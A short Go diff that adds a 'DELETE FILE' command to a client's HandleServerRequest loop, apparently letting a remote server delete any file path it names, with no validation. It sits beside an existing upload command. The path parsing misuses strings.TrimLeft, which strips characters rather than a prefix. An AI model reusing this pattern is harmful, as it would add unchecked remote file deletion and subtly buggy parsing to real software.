@@ -194,6 +194,19 @@ func (h *Handler) HandleServerRequest() {
 					break
 				}
 
+				//DELETE FILE
+				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandDelete) &&
+					payload.Request[:len(h.Configuration.CommandHandler.CommandDelete)] == h.Configuration.CommandHandler.CommandDelete {
+					filePath := strings.TrimSpace(strings.TrimLeft(payload.Request, h.Configuration.CommandHandler.CommandDelete))
+					err := h.Services.Delete.DeleteFile(filePath)
+					if err != nil {
+						response = encode.StringToByte(err.Error())
+						hasErr = true
+						break
+					}
+					break
+				}
+
 				//UPLOAD FILE
 				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandUpload) &&
 					payload.Request[:len(h.Configuration.CommandHandler.CommandUpload)] == h.Configuration.CommandHandler.CommandUpload {
